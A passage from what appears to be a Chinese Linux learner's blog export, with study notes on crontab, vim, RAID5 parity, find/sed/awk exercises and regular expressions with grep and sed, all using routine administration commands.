定时任务中，善于使用命令的绝对路径（使用which来查看命令的绝对路径）3. 尽量在cron中去定期运行脚本而不是很多命令4. 尽量使用&#x2F;bin&#x2F;sh去解释脚本，如：&#x2F;bin&#x2F;sh print_ip.sh 5. 定时任务中-命令或脚本结果（正确及错误）定向到空（&#x2F;dev&#x2F;null）或定向到指定文件中。6. 扩展1: vim命令123456789101112131415161718192021222324dG(d+shift+g) 删除当前行的内容，到最后一行一行的内容yy 复制dd 删除&#x2F;剪切p 粘贴5dd 从当前行开始计算，向下删除5行（包含当前行）。即nddyy100n 粘贴n次 yy100p 复制当前行，同时粘贴100次100u 撤销100行的操作u 撤销:wq 保存退出:q! 不保存，强制退出:set nu 显示行号G（shift+g） 快速到达文件的最后一行10G 快速到达第10行gg 快速到达文件第一行100gg 快速到达第100行o （小o）在当前行的下面插入一行并进入编辑模式^或0 快速移动到当前行的行首$ 快速移动到当前行的行尾&#x2F;ssh 查找&#x2F;搜索ssh字符（n继续往下查找, N向上查找）:h p vim查看帮助:h gg 查找gg的帮助:h dG 查找dG的帮助 扩展2: while死循环执行命令12345678910# vim ntpdate.sh sleep 300; &#x2F;&#x2F;300秒，即5分钟执行一次 #!&#x2F;bin&#x2F;sh while true do &#x2F;usr&#x2F;sbin&#x2F;ntpdate ntp1.aliyun.com &gt;&gt; &#x2F;root&#x2F;ntp_gary.log 2&gt;&amp;1 sleep 1 done # bash ntpdate.sh 扩展3: 查看ip 地址123ip addressip address show eth0 正则命令回顾1echo -e &quot;\\na\\tb\\na&quot; -e参数让echo支持转义符; \\n 换行 ； \\t 表示tab键，约8个字符长度的区域 12345678^$表示空行要求：查看services文件（不显示空行）egrep -v &quot;^$&quot; &#x2F;etc&#x2F;servicessed &#39;&#x2F;^$&#x2F;d&#39; &#x2F;etc&#x2F;servicesawk &#39;!&#x2F;^$&#x2F;&#39; &#x2F;etc&#x2F;services[^t] 除了包含t的行^[^t] 除了以t开头的行 正则-取IP地址【排除方式】123456[root@oldboy202 scripts]# ifconfig eth0 |awk -F &#39;[^0-9.]+&#39; &#39;NR&#x3D;&#x3D;2&#123;print $2&#125;&#39;10.0.0.202注：[^0-9.]+ 表示除了连续的0-9和点 NR&#x3D;&#x3D;2 取行 &#123;print $2&#125;取第二列 取出passwd 第一列【正反方式】12345678910111213141516171819202122232425head &#x2F;etc&#x2F;passwd &gt;passwd 拷贝passwd文件用于环境测试[root@oldboy202 ~]# egrep -o &quot;^[a-z0-9A-Z_-]+&quot; passwd rootbindaemonadmlp查找连续以0-9、a-z、A-Z以及下划线&quot;_&quot;和减号&quot;-&quot;开头的行,注意：减号“-”必须放在最后，否则报错[root@oldboy202 ~]# egrep -o &quot;^[^:]+&quot; passwd 除了以连续:冒号开头的行rootbindaemonadmlpsync[root@oldboy202 ~]# egrep -o &quot;[^:]+$&quot; passwd 除了以连续冒号:为结尾的行&#x2F;bin&#x2F;bash&#x2F;sbin&#x2F;nologin&#x2F;sbin&#x2F;nologin&#x2F;sbin&#x2F;nologin&#x2F;sbin&#x2F;nologin","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"crontab","slug":"crontab","permalink":"https://garywu520.github.io/tags/crontab/"}]},{"title":"RAID5工作原理","slug":"RAID5工作原理","date":"2017-06-23T06:16:32.000Z","updated":"2018-01-30T03:21:04.318Z","comments":true,"path":"2017/06/23/RAID5工作原理/","link":"","permalink":"https://garywu520.github.io/2017/06/23/RAID5%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/","excerpt":"RAID 5是一种存储性能、数据安全和存储成本兼顾的存储解决方案。RAID 5不对存储的数据进行备份，而是把数据和相对应的奇偶校验信息存储到组成RAID 5的各个磁盘上，并且奇偶校验信息和相对应的数据分别存储于不同的磁盘上。","text":"RAID 5是一种存储性能、数据安全和存储成本兼顾的存储解决方案。RAID 5不对存储的数据进行备份，而是把数据和相对应的奇偶校验信息存储到组成RAID 5的各个磁盘上，并且奇偶校验信息和相对应的数据分别存储于不同的磁盘上。 当RAID 5的一个磁盘数据发生损坏后，利用剩下的数据和相应的奇偶校验信息去恢复被损坏的数据。 RAID 5可以理解为是RAID 0和RAID 1的折中方案。RAID 5具有和RAID 0相近似的数据读取速度，只是多了一个奇偶校验信息，写入数据的速度比对单个磁盘进行写入操作稍慢。同时由于多个数据对应一个奇偶校验信息，RAID 5的磁盘空间利用率要比RAID 1高，存储成本相对较低。 RIAD5 奇偶校验信息 - 异或运算 1.异或的逻辑符号：^ 2.异或的逻辑定义同则假，异则真（0^0=0，1^1=0， 0^1=1 ，1^0=1） 3.计算机中的逻辑运算用1表示真，0表示假。 4.两个字节按位异或的例子：0111100111100111 ：异或运 ^-——————10011110 5.假设一个3个数字的异或运算模型例：3块硬盘HD1,HD2,HD3的数据信息全通过校验盘HD4存放校验信息 hd1 hd2 hd3 hd4 0 0 0 –0 0 0 1 –1 0 1 0 –1 0 1 1 –0 1 0 0 –1 1 0 1 –0 1 1 0 –0 1 1 1 –1 从这个模型理解异或运算的概念：偶数个1的结果为0，奇数个1的结果为1； 图解RIAD5 RAID的保存原理是用Bit Striping及当前主流Block Striping的分割方式，将Data分散保存至各硬盘中，当硬盘有受损时则经由XOR运算，再将存在其他各硬盘内的Parity Blocks及Data Stripe磁区的Data Blocks进行计算而重建资料Rebuild。 RIAD5 正常模式图解 RIAD5 受损模式图解 RIAD5 复原（XOR运算）图解 文章参考: Linuxprobe","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"RAID5","slug":"RAID5","permalink":"https://garywu520.github.io/tags/RAID5/"}]},{"title":"Shadowsocks-翻墙利器","slug":"Shadowsocks-翻墙利器","date":"2017-06-21T04:14:57.000Z","updated":"2017-08-22T06:31:15.651Z","comments":true,"path":"2017/06/21/Shadowsocks-翻墙利器/","link":"","permalink":"https://garywu520.github.io/2017/06/21/Shadowsocks-%E7%BF%BB%E5%A2%99%E5%88%A9%E5%99%A8/","excerpt":"","text":"","categories":[],"tags":[]},{"title":"老男孩37期-Day8-往期知识点-回顾","slug":"老男孩37期-Day8-往期知识点-回顾","date":"2017-06-17T01:31:40.000Z","updated":"2017-06-21T09:24:04.795Z","comments":true,"path":"2017/06/17/老男孩37期-Day8-往期知识点-回顾/","link":"","permalink":"https://garywu520.github.io/2017/06/17/%E8%80%81%E7%94%B7%E5%AD%A937%E6%9C%9F-Day8-%E5%BE%80%E6%9C%9F%E7%9F%A5%E8%AF%86%E7%82%B9-%E5%9B%9E%E9%A1%BE/","excerpt":"检测网站访问速度1Chrome浏览器按F12 -- Network--刷新网页就可以看到网页加载完成时间、状态码、页面大小等信息。 查看进程12ps -ef 查看进程ps -ef |grep sshd 守护进程，比如sshd、crond等","text":"检测网站访问速度1Chrome浏览器按F12 -- Network--刷新网页就可以看到网页加载完成时间、状态码、页面大小等信息。 查看进程12ps -ef 查看进程ps -ef |grep sshd 守护进程，比如sshd、crond等 安装包组123yum grouplist 查看已安装包组或未安装包组yum groupinstall &quot;包组名&quot; 如何检查22端口是否畅通？12345671. telnet 10.0.0.200 22 工具安装：yum install -y telnet2. 方法1：ss -lntup |grep 22 方法2：netstat -lntup |grep 22 方法3：lsof -i:223. nmap -p 22 10.0.0.200 工具安装：yum install -y nmap 12nmap知识扩展：nmap -p 22 10.0.0.0&#x2F;24 扫描并显示整个局域网开启22端口的机器 1234567891011[root@oldboyedu36-nb ~]#cat oldboy.txt oldboyedu.com要求：把oldboyedu.com改为com.oldboyedu ?[root@oldboyedu36-nb ~]# sed -r &#x27;s#(^.*)\\.(.*$)#\\2.\\1#g&#x27; oldboy.txtcom.oldboyedu[root@oldboyedu36-nb ~]# sed -ri.bak &#x27;s#(^.*)\\.(.*$)#\\2.\\1#g&#x27; oldboy.txt// 替换之前先进行备份 -i 参数用于备份，该参数一定要放在-r参数后面，比如：-ri.bak vi/vim快捷方式123456789复制当前这一行的内容: yy 粘贴:p剪切(删除): dd 撤销:uvimtutor //vim帮助文档 history123history 查看历史命令history |tail 查看最近10个命令!ping 使用最近一次包含ping字符的命令 sed123456789101112131415161718sed -n &#x27;/你要找的内容（正则）/p&#x27; oldboy.txt //sed查找内容查找-示例1：sed -n &#x27;/^oldboy/p&#x27; oldboy.txt -n和p 意思是临时显示内容（没有实际修改）删除某行-示例：sed &#x27;/你要找的内容/d&#x27; oldboy.txt d表示删除替换-示例：sed -n &#x27;/3306/s#3306#3389#gp&#x27; services //3306端口改为3389sed -n &#x27;/3306/p&#x27; services |sed &#x27;s#3306#3389#g&#x27; //3306端口改为3389。s和g组合表示全局替换（s替换，g表示全局）注：-n禁止与-i一起使用，否则会造成源文件内容被清空sed -i &#x27;/3306/s#3306#3389#gp&#x27; services //正式写入文件sed -n &#x27;/3389/p&#x27; services //查看修改结果 取IP地址(跟大牛学命令)12345678awk取IP地址思路：ifconfig eth0 |awk -F &#x27;[ :]+&#x27; &#x27;&#123;print&#125;&#x27; 打印所有ifconfig eth0 |awk -F &#x27;[ :]+&#x27; &#x27;/inet addr/&#123;print&#125;&#x27; 打印inet addr的行ifconfig eth0 |awk -F &#x27;[ :]+&#x27; &#x27;/inet addr/&#123;print $4&#125;&#x27; 取IP列sed取IPifconfig eth0 |sed -rn &#x27;s###gp&#x27; sed查找替换打印-标准格式ifconfig eth0 |sed -rn &#x27;s#^.*inet addr:(.*) Bcast:.*#\\1#gp&#x27; 压缩123456tar zcf /tmp/etc-2017-06-21.tar.gz /etc/ tar tf etc-2017-06-21.tar.gz 不压缩直接查看压缩文件zip压缩解压zip services.zip /etc/services zip压缩unzip services.zip unzip解压 重要文件md5检查123456789[root@oldboy202 ~]# md5sum oldboy.txt ccd2a6bf2dd40cd57997121d46db06a7 oldboy.txt[root@oldboy202 ~]# md5sum oldboy.txt &gt; check.sum[root@oldboy202 ~]# md5sum -c check.sum oldboy.txt: OK[root@oldboy202 ~]# echo haha &gt;&gt; oldboy.txt 改变内容，测试检查.[root@oldboy202 ~]# md5sum -c check.sum oldboy.txt: FAILEDmd5sum: WARNING: 1 of 1 computed checksum did NOT match 测试题1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001. 查找出/tmp目录下面修改时间是7天以前，大小在50k到2M之间，并以.log结尾的文件把这些文件复制到/data目录方法一：find /tmp/ -type f -mtime +7 -size +50k -size -2M -name &quot;*.log&quot;|xargs -i cp &#123;&#125; /data默认xargs不支持花括号，加速-i参数就可以用&#123;&#125;花括号了。方法二：find /tmp/ -type f -mtime +7 -size +50k -size -2M -name &quot;*.log&quot; -exec cp &#123;&#125; /tmp \\;&#123;&#125;表示find命令找到的文件。-mtime +7表示7天之前，7表示第7天，-7表示最近7天方法三:find /tmp/ -type f -mtime +7 -size +50k -size -2M -name &quot;*.log&quot;|xargs cp -t /data方法四：cp $( find /oldboy/ -type f -name &quot;*.log&quot; -size +1M) /tmp/b查找/oldboy目录下所有7天以前的，以log结尾的，并且大于1M的文件，把这些文件移动到/tmp下.find /oldboy -type f -size +1M -name &quot;*.log&quot; -mtime +7 | xargs -i mv &#123;&#125; /tmp/2. 查找出/tmp目录下面修改时间是7天以前，大小在50k到2M之间，并以.log结尾的文件 find /tmp/ -type f -mtime +7 -size +50k -size -2M -name &quot;*.log&quot; 这是个非常常用的参数-size根据文件大小查找文件 -size +50k 表示 大于50k的文件 -size -2M 表示 小于2M的文件 在find命令中，默认就表示并且 -size +50k 并且 -size -2M 3. 在上题的基础上，使用命令调换passwd文件里root位置和/bin/bash位置，即第一列和最后一列位置调换方法1：[root@oldboy202 ~]# head passwd |sed -r &#x27;s#(^.*)(:x.*:)(.*)#\\3\\2\\1#g&#x27;/bin/bash:x:0:0:root:/root:root/sbin/nologin:x:1:1:bin:/bin:bin/sbin/nologin:x:2:2:daemon:/sbin:daemon/sbin/nologin:x:3:4:adm:/var/adm:adm方法3：awk -F &#x27;:&#x27; &#x27;&#123;OFS=&quot;:&quot;;print&#125;&#x27; /etc/passwd 固定格式awk -F &#x27;:&#x27;&#x27;&#123;OFS=&quot;:&quot;;tmp=$1;$1=$7;$7=tmp;print&#125;&#x27; /etc/passwd 第一个冒号：是输入分割第二个冒号：表示OFS输出分割字符tmp可以理解为一个空箱子，先把$1的苹果装箱子，然后把$1的苹果放到$7香蕉的位置,最后$7的香蕉装箱子放到前面位置。4. 输出test.txt文件内容时，不包含trainning字符串的命令 [root@oldboy202 ~]# cat test.txt trainning fanbingbing lidao 方法1： [root@oldboy202 ~]# grep &quot;^[^trainning]&quot; test.txt fanbingbing lidao 方法2： [root@oldboy202 ~]# egrep -v &quot;^trainning&quot; test.txt fanbingbing lidao 方法3： [root@oldboy202 ~]# awk &#x27;!/trainning/&#x27; test.txt 在awk中!表示取反 fanbingbing lidao 5. 取出文件ett.txt]()的第30到40行的内容。 环境创建：seq 20 120 &gt; ett.txt [root@oldboy202 ~]# sed -n &#x27;30,40p&#x27; ett.txt [root@oldboy202 ~]# awk &#x27;NR==30,NR==40&#x27; ett2.txt [root@oldboy202 ~]# grep -n &quot;.&quot; ett2.txt |grep -A10 &quot;^30&quot; [root@oldboy202 ~]# awk &#x27;NR&gt;=30 &amp;&amp; NR&lt;=40&#x27; ett.txt 6. 如何把/data目录下所有包含oldboy的目录（可能目录的目录的目录里还有oldboy目录） 目录都打包出来。要求:解压打包后的目录结构不能改变。 find /data/ -type d -name &quot;oldboy&quot; |xargs tar zcf data.tar.gz tar zcf data.tar.gz $&#123;find /data/ -type d -name &quot;oldboy&quot;&#125; find /data/ -type d -name &quot;oldboy&quot; -exec tar zcf data.tar.gz &#123;&#125; \\; 注：-exec find命令找到一个文件就给后面的命令处理一次，而压缩名字一直没变，所以多次压缩结果均会被覆盖，最后压缩包里面只有1个最新被压缩的目录 tar xf data.tar.gz 不解压直接看压缩包内容7. 把/etc/目录打包压缩放在/tmp目录下面，并给压缩包加上一个时间，etc-2017-06-17.tar.gz tar zcf /tmp/etc-$(date +%F).tar.gz /etc/ 8. 将题上题中的 oldboy.txt 文件内容通过命令过滤只输出如下内容： inet addr:10.0.0.202 Bcast:10.0.0.255 Mask:255.255.255.0 输出为 10.0.0.8 10.0.0.255 255.255.255.0 awk -F &quot;[ :]&quot; &#x27;&#123;print $3,$5,$7&#125;&#x27; oldboy.txt awk -F &quot;[^0-9.]+&quot; &quot;&#123;print $2,$3,$4&#125;&quot; oldboy.txt sed -r &#x27;s#[^0-9.]+# #g&#x27; /data/oldboy/oldboy.txt //除了数字和点以外的字符都替换为空格 9. 查找出/data目录下所有以.txt结尾的文件并且把文件中的trainning修改为oldboy. （不少于2种方法） find /data -type f -name &quot;*.txt&quot; find /data -type f -name &quot;*.txt&quot; |xargs sed &#x27;s#trainning#oldboy#g&#x27; sed &#x27;s#trainning#oldboy#g&#x27; $(find /data -type f -name &quot;*.txt&quot; ) find /data -type f -name &quot;*.txt&quot; -exec sed &#x27;s#tranning#oldboy#g&#x27; &#123;&#125; \\; 总结12345678910111213141516171819202122232425262728293031总结：find-maxdepth 最大的深度 最深的目录层数 -type 类型 d | f -name 名字 &quot;*.log&quot;-size 大小 +10k -10k k M G-mtime 修改时间 +7 7天以前 sed 取行 查找替换 删除文件内容sed &#x27;找谁干啥&#x27;找谁1.固定的行号 2p 2,10p干啥#sed里面的命令 #p---print 显示出来 需要和-n 配合 #s---substitute 替换 s#oldboy#oldgirl#g (global 全局) s和g放在一起表示全局替换#d---delete 删除某行 （grep -v )awk-F 指定每一列的分隔符 菜刀 NR行号 &#x27;/找谁/&#x27; &#x27;NR==2&#x27; &#x27;NR==2,NR==10&#x27;","categories":[],"tags":[{"name":"Linux基础","slug":"Linux基础","permalink":"https://garywu520.github.io/tags/Linux%E5%9F%BA%E7%A1%80/"},{"name":"知识点回顾","slug":"知识点回顾","permalink":"https://garywu520.github.io/tags/%E7%9F%A5%E8%AF%86%E7%82%B9%E5%9B%9E%E9%A1%BE/"}]},{"title":"正则表达式egrep/sed/awk-整理总结","slug":"正则表达式egrep-sed-awk-整理总结","date":"2017-06-16T10:43:45.000Z","updated":"2017-06-16T10:47:53.682Z","comments":true,"path":"2017/06/16/正则表达式egrep-sed-awk-整理总结/","link":"","permalink":"https://garywu520.github.io/2017/06/16/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8Fegrep-sed-awk-%E6%95%B4%E7%90%86%E6%80%BB%E7%BB%93/","excerpt":"本总结目的把三剑客工具整理到一篇文档中，方便学习、对比与记忆。 文章尽可能做到全面、详尽，不足之处，可联系我更正。","text":"本总结目的把三剑客工具整理到一篇文档中，方便学习、对比与记忆。 文章尽可能做到全面、详尽，不足之处，可联系我更正。 通配符 首先来了解下通配符与正则表达式的区别。 通配符：可以简单理解为键盘上除了字母和数字之前的特殊符号。 正则表达式：为处理大量文本/字符串而定义的一套规则和方法，以行为单位处理 123456789简单理解为键盘上除了字母和数字之外的特殊符号，称为通配符* 匹配任意文本&#x2F;字符串，例：*.txt 、*.log等&#123;&#125; 用于生成序列。花括号里面以逗号分隔，且不能有空格 $ 取变量的值·· （Esc键下边）反引号 | 管道; 用于分隔，比如：ls -l ;pwd (前面执行失败，后面依然执行)&amp;&amp; 用于分隔，比如：ls -l &amp;&amp; pwd(前面执行成功，才会执行后面的命令) 接下来详细说下上面特殊符号的基本用法 *(星号) 1234567ls -l *.log *.txt 查找后缀为log和txt的文件ls -l stu* 查找以stu开头的文件cat stu* 查看stu开头文件的内容ls -l stu*.txt 查看stu开头并且以txt结尾 {} (花括号) 123456789101112131415161718192021222324252627282930313233343536[root@oldboy202 20170118]# echo &#123;1..5&#125;1 2 3 4 5[root@oldboy202 20170118]# echo &#123;5..1&#125;5 4 3 2 1[root@oldboy202 20170118]# echo &#123;1..5&#125; &#123;a..z&#125;1 2 3 4 5 a b c d e f g h i j k l m n o p q r s t u v w x y z[root@oldboy202 20170118]# echo A&#123;B,C,D&#125;AB AC AD[root@oldboy202 20170118]# echo 2&#123;2,3,4&#125;22 23 24[root@oldboy202 20170118]# echo &#123;1,3,5&#125;1 3 5echo stu&#123;0..5&#125; 工作中常用示例1：创建文件 stu01.txt 到stu05.txt[root@oldboy202 ~]# touch stu&#123;01..5&#125;.txt[root@oldboy202 ~]# ls stu*.txtstu01.txt stu02.txt stu03.txt stu04.txt stu05.txt示例2：使用花括号进行备份公式1： echo A&#123;B,C&#125; 意思是结果粘在一起 AB AC 公式2： echo A&#123;,C&#125; A AC 使用花括号备份cp oldboy.txt&#123;,.bak&#125; 这条命令就等于执行 cp oldboy.txt oldboy.txt.bak ​ 聊聊单引号、双引号和不加引号的区别 ‘’ “” 不加引号 1234567891011单引号：通俗理解吃啥吐啥[root@oldboy202 ~]# echo &#39;$(which mkdir) &#123;a..z&#125;&#39;$(which mkdir) &#123;a..z&#125;双引号：可执行命令的结果，但不支持通配符，比如&#123;&#125;花括号[root@oldboy202 ~]# echo &quot;$(which mkdir) &#123;a..z&#125;&quot;&#x2F;bin&#x2F;mkdir &#123;a..z&#125;不加引号：既可以执行命令结果，又可以支持通配符[root@oldboy202 ~]# echo $(which mkdir) &#123;a..z&#125;&#x2F;bin&#x2F;mkdir a b c d e f g h i j k l m n o p q r s t u v w x y z 正则表达式 什么是正则表达式？ 为处理大量文本/字符串而定义的一套规则和方法（以行为单位处理）称为正则表达式，英文简称RE。 正则表达式与通配符的区别？ 正则表达式是在文件中查找内容，而通配符一般是查找匹配文件 egrep/grep技巧 让查找的内容显示颜色 方式一：命令上添加–color=auto 如：grep –color=auto 3306 /etc/services 方式2：定义环境变量 1234567alias egrep&#x3D;&#39;egrep --color&#x3D;auto&#39;alias grep&#x3D;&#39;grep --color&#x3D;auto&#39; cat &gt;&gt;&#x2F;etc&#x2F;profile&lt;&lt;EOFalias egrep&#x3D;&#39;egrep --color&#x3D;auto&#39;alias grep&#x3D;&#39;grep --color&#x3D;auto&#39;EOFsource &#x2F;etc&#x2F;profile 正则表达式分类 基本正则表达式（BRE，basic regular expression） 高级功能:扩展正则表达式（ERE，extended regular expression） 基本正则表达式测试环境准备 cat oldboy.txt 12345678910I am oldboy teacher!I teach linux.I like badminton ball ,billiard ball and chinese chess!my blog is http:&#x2F;&#x2F;oldboy.blog.51cto.comour site is http:&#x2F;&#x2F;www.etiantian.orgmy qq num is 49000448.not 4900000448.my god ,i am not oldbey,but OLDBOY! 1234567891011^ 尖角号 找以什么开头的行示例：grep &quot;^my&quot; oldboy.txt &#x2F;&#x2F;查找以my开头的行$ 找以什么结尾的行示例： grep &quot;m$&quot; oldboy.txt ^$ 表示找空行，这一行什么都没有（不是空格）示例： grep -n &quot;^$&quot; oldboy.txt 3: 8:注：-n 参数意思是添加行号 PS：cat -A oldboy.txt 查看文件空行，空格以$显示 1234567891011121314151617. (点) 这个正则表达式，一次可以找到任意1个字符PS： grep -o “.” oldboy.txt 显示grep 1次找到了什么内容通常与 grep -o “.*” oldboy.txt 一般这么使用，查看找到的所有内容示例1：如果我忘了中间是什么字符，如何匹配查找？[root@oldboy202 ~]# grep &quot;oldb.y&quot; oldboy.txt I am oldboy teacher!my blog is http:&#x2F;&#x2F;oldboy.blog.51cto.commy god ,i am not oldbey,but OLDBOY!示例2：查找以小数点 “.” 结尾的行[root@oldboy202 ~]# grep &quot;\\.$&quot; oldboy.txt I teach linux.my qq num is 49000448.not 4900000448.因为.在三剑客有特殊含义，所以需要转义，需要用到\\ 123456\\ 撬棍，转义示例3：查找包含“&#x2F;&#x2F;” 字符的行[root@oldboy202 ~]# egrep &quot;\\&#x2F;\\&#x2F;&quot; oldboy.txt my blog is http:&#x2F;&#x2F;oldboy.blog.51cto.com our site is http:&#x2F;&#x2F;www.etiantian.org 123456780* 表示连续出现多次的时候，就会把 000 00000都取出来。grep -o &quot;0*&quot; oldboy.txt &#x2F;&#x2F;查看grep如何去查找连续000000000*连续是指从0作为起始，1次以上（含1次）即视为多次+ 加号的连续是从1作为起始（后面会说到） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253.* 匹配文本*前面任意字符的所有内容示例1：grep -on &quot;.*&quot; oldboy.txt示例2：grep &quot;^.*o&quot; oldboy.txt 查找以任1个字符开头且包含o的行表示连续或重复的时候，正则会匹配的更多示例：[root@oldboy202 ~]# grep -no &quot;^.*e&quot; oldboy.txt 1:I am oldboy teache2:I te4:I like badminton ball ,billiard ball and chinese che6:our site is http:&#x2F;&#x2F;www.e10:my god ,i am not oldbe[root@oldboy202 ~]# grep &quot;^.*e&quot; oldboy.txt I am oldboy teacher!I teach linux.I like badminton ball ,billiard ball and chinese chess!our site is http:&#x2F;&#x2F;www.etiantian.orgmy god ,i am not oldbey,but OLDBOY![root@oldboy202 ~]# egrep &quot;.*g.*$&quot; oldboy.txt my blog is http:&#x2F;&#x2F;oldboy.blog.51cto.comour sigte is http:&#x2F;&#x2F;www.etiantian.orgmy god ,i am not oldbey,but OLDBOY!^.* 从头匹配所有，直到指定字符结束示例：[root@oldboy202 ~]# grep &quot;^.*b&quot; oldboy.txt I am oldboy teacher!I like badminton ball ,billiard ball and chinese chess!my blog is http:&#x2F;&#x2F;oldboy.blog.51cto.commy god ,i am not oldbey,but OLDBOY![abc] 匹配字符集合，正则将其视为一个整体，匹配A或匹配B或匹配C[A-Z]匹配大小写字母[a-z][0-9]匹配数字示例：grep &quot;[b]&quot; oldboy.txtgrep -no &quot;[abc]&quot; oldboy.txtgrep &quot;[A-Z]&quot; oldboy.txtgrep &quot;[1-9a-zA-Z]&quot; oldboy.txt示例：找以大写字母开头的行grep &quot;^[A-Z]&quot; oldboy.txt找以小写字母结尾的行grep &quot;[a-z]$&quot; oldboy.txt 1234567891011121314151617181920212223练习：找以m或n或o开头的 并且以m或g结尾的行？方法1：[root@oldboy202 ~]# grep &quot;^[mno]&quot; oldboy.txt |grep &quot;[mg]$&quot;my blog is http:&#x2F;&#x2F;oldboy.blog.51cto.comour site is http:&#x2F;&#x2F;www.etiantian.org方法2：[root@oldboy202 ~]# grep &quot;^[mno].*[mg]$&quot; oldboy.txt my blog is http:&#x2F;&#x2F;oldboy.blog.51cto.comour site is http:&#x2F;&#x2F;www.etiantian.org[^abc] 匹配不包含^后面的字符，其他字符都要grep &quot;[^abc]&quot; oldboy.txt练习：找出除了m或n开头的行[root@oldboy202 ~]# grep &quot;^[^mn]&quot; oldboy.txt I am oldboy teacher!I teach linux.I like badminton ball ,billiard ball and chinese chess!our site is http:&#x2F;&#x2F;www.etiantian.org 12345678910查找模糊字符串？[root@oldboy202 ~]# grep &quot;old.*y&quot; oldboy.txt I am oldboy teacher!my blog is http:&#x2F;&#x2F;oldboy.blog.51cto.commy god ,i am not oldbey,but OLDBOY!扩展2：grep -v 与[^abc]区别grep -v 排除掉某行[^abc] 排除掉a或b或c示例：grep -v &quot;[mn]&quot; oldboy.txt 扩展正则表达式12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273命令：egrep 或grep -E +（加号） 前一个字符连续出现了1个或多个 注：正则里面加号1次就认为是多次 示例： [root@oldboy202 ~]# egrep &quot;0+&quot; oldboy.txt my qq num is 49000448. not 4900000448. 查看egrep是如何查找的？ [root@oldboy202 ~]# egrep -o &quot;0+&quot; oldboy.txt 000 00000 示例：查找连续小写字母取出来(注：取的是连续的字符) [root@oldboy202 ~]# egrep &quot;[a-z]+&quot; oldboy.txt I am oldboy teacher! I teach linux.| 管道在正则里面意思是“或者”示例1：egrep &quot;3306|1521&quot; &#x2F;etc&#x2F;services示例2：找出my或者oldboy取出来[root@oldboy202 ~]# egrep &quot;my|oldboy&quot; oldboy.txt I am oldboy teacher!my blog is http:&#x2F;&#x2F;oldboy.blog.51cto.com示例3：找出dumpe2fs &#x2F;dev&#x2F;sda1结果中的inode size和inode countdumpe2fs &#x2F;dev&#x2F;sda1 |egrep -i &quot;inode size|innode count&quot;() 小括号，正则里面表示一个整体示例1：取出oldboy和oldbey[root@oldboy202 ~]# egrep &quot;oldb(o|e)y&quot; oldboy.txt I am oldboy teacher!my blog is http:&#x2F;&#x2F;oldboy.blog.51cto.commy god ,i am not oldbey,but OLDBOY!示例2：找出good和glad[root@oldboy202 ~]# egrep &quot;g(oo|la)d&quot; a.log goodglad? 问号，重复前面的字符0次或1次示例：[root@oldboy202 ~]# egrep &quot;go?d&quot; a.log gd goda&#123;n,m&#125; 重复前面的字符n到m次a&#123;n,&#125; 重复前面最少n次a&#123;,m&#125; 重复前面最多n次示例1：[root@oldboy202 ~]# egrep -o &quot;0&#123;1,3&#125;&quot; oldboy.txt 00000000示例2：[root@oldboy202 ~]# egrep &quot;0&#123;3,4&#125;&quot; oldboy.txt my qq num is 49000448.not 4900000448.查看其匹配工作情况[root@oldboy202 ~]# egrep -o &quot;0&#123;3,4&#125;&quot; oldboy.txt 0000000 注：egrep 和 sed -r 支持扩展正则，而awk默认支持正则，无需加参数 egrep/sed/awk三剑客-实例用法1. 利用sed取出eth0的IP地址步骤： 第一步:定位；第二部：取内容 123456789方法1：（掐头去尾法）取IP地址[root@oldboy202 ~]# ifconfig eth0|sed -n &#39;2p&#39; |sed &#39;s#^.*addr:##g&#39;|sed &#39;s#Bc.*$##g&#39;10.0.0.202 取出Bcast地址[root@oldboy202 ~]# ifconfig eth0|sed -n &#39;2p&#39; |sed &#39;s#^.*ast:##g&#39; |sed &#39;s#Mask.*$##g&#39;10.0.0.255 123456789101112方法2：（精简-掐头去尾法）取IP [root@oldboy202 ~]# ifconfig eth0 |sed -n &#39;2p&#39; |sed -r &#39;s#^.*dr:|Bc.*$##g&#39; 10.0.0.202 取Bcast地址[root@oldboy202 ~]# ifconfig eth0|sed -n &#39;2p&#39; |sed -r &#39;s#^.*ast:|Mask.*$##g&#39;10.0.0.255 注：sed -r 使用扩展正则 | 表示或者 反向引用-预备知识：保留谁就括谁 [root@oldboy202 ~]# echo 123456 |sed -r ‘s#..(..)..#\\1#g’34[root@oldboyedu37-nb 20170118]# echo 123456|sed -r ‘s#.(.).(.)..#\\1 \\2#g’2 4[root@oldboyedu37-nb 20170118]# echo 123456|sed -r ‘s#.(.).(.)..#\\2 \\1 \\2 \\2 \\2 #g’4 2 4 4 4[root@oldboy202 ~]# echo 123456|sed -r ‘s#.(…).#\\1#g’2346 注：1.前面有多少个字符，就需要写几个点2.后面的\\1是指前面括号里边的内容 12345678方法3：反向引用-取出IP地址[wuyanteng@ns-2 ~]$ ifconfig eno16777984 |sed -n &#39;2p&#39;|sed -r &#39;s#^.*net (.*)netm.*$#\\1#g&#39;10.0.0.20同理，取出Bcast地址（我这个Bcast地址在最后一列）[wuyanteng@ns-2 ~]$ ifconfig eno16777984 |sed -n &#39;2p&#39; |sed -r &#39;s#^.*cast (.*)#\\1#g&#39;10.0.1.255 123456789方法4：对某一行字符串进行替换格式：sed -n &#39;5#原内容#新内容#p&#39; filename示例：替换oldboy.txt中第5行的oldboy为oldgirlsed -n &#39;5s#oldboy#oldgirl#gp&#39; oldboy.txt[wuyanteng@ns-2 ~]$ ifconfig eno16777984 |sed -nr &#39;2s#^.*net (.*) netma.*$#\\1#gp&#39; 10.0.0.20 1234567egrep方法5: [wuyanteng@ns-2 ~]$ ifconfig eno16777984 |grep &quot;inet &quot; |egrep -o &quot;inet [0-9.]*&quot; |egrep -o &quot;[0-9.]*&quot;10.0.0.20注释：ifconfig eno16777984 |grep &quot;inet &quot; 显示包含“inet ”的行egrep -o &quot;inet [0-9.]*&quot; |egrep -o &quot;[0-9.]*&quot; .是因为IP地址包括点 * 代表之前的[0-9.]匹配多次 SED文件内容替换12345678910sed -i.bak 